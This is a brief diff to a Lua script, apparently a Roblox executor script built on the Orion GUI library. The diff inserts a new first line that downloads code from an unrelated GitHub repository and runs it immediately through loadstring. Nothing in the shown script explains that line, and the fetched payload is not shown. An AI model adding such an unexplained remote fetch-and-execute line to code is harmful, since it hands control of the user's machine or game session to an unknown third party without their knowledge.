@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://github.com/dianxiangwang015-bot/-/blob/main/114514"))()
+
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
 
 -- GUI创建
